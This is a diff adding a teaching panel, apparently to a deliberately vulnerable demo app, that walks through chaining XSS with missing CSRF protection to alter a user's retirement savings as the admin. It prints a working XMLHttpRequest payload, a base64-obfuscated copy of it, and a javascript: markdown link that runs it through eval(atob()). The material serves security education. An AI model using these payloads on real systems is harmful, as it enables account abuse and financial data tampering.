@@ -169,6 +169,50 @@
                     </div>
                 </div>
 
+                <div class="panel panel-info">
+                    <div class="panel-heading">
+                        <h3 class="panel-title">Abusing Components vulnerable to Cross-site Scripting and lack of CSRF</h3>
+                    </div>
+                    <div class="panel-body">
+                        <p>
+                            The following is a practical case of how an attacker can abuse XSS and lack of CSRF protection to perform
+                            a client-side attack that has a high impact on the victim.
+                        </p>
+        
+                        <p>
+                            The attacker's goal is to send a request on behalf of the retirement system admin so that they can 
+                            manipulate data such as the retirement savings of a user. The attacker can do this by sending a request
+                            to the server that will perform the action on behalf of the admin.
+                        </p>
+        
+                        <p>
+                            Such request that will update the savings of the user is presented in the following XMLHTTPRequest code:
+                        </p>
+                        <pre>
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'http://localhost:5000/savings', true);
+        xhr.setRequestHeader('content-type', 'application/x-www-form-urlencoded');
+        xhr.send('userId=1&totalSavings=1');</pre>
+        
+                        <p>
+                            The attacker can send this request by abusing the XSS vulnerability on the profile page.
+        
+                            To further make the attack effective and stealthy, the attacker can use the following code to hide the
+                            attack payload as a base64 encoded string which also makes it easy to transport as an ASCII string:
+                            </p>
+                        <pre>
+        bGV0IHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignUE9TVCcsICdodHRwOi8vbG9jYWxob3N0OjUwMDAvc2F2aW5ncycsIHRydWUpOyB4aHIuc2V0UmVxdWVzdEhlYWRlcignY29udGVudC10eXBlJywgJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcpOyB4aHIuc2VuZCgndXNlcklkPTEmdG90YWxTYXZpbmdzPTEnKTs=</pre>
+        
+                        <p>
+                            The attacker can then use the following code to execute the attack:
+                        </p>
+        <pre>
+        // the following embedded as a markdown link
+
+        [I'm here!](javascript&#58this;eval(atob('bGV0IHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignUE9TVCcsICdodHRwOi8vbG9jYWxob3N0OjUwMDAvc2F2aW5ncycsIHRydWUpOyB4aHIuc2V0UmVxdWVzdEhlYWRlcignY29udGVudC10eXBlJywgJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcpOyB4aHIuc2VuZCgndXNlcklkPTEmdG90YWxTYXZpbmdzPTEnKTs='&#41;&#41;)</pre>
+                    </div>
+                </div>
+
             </div>
         </div>
 
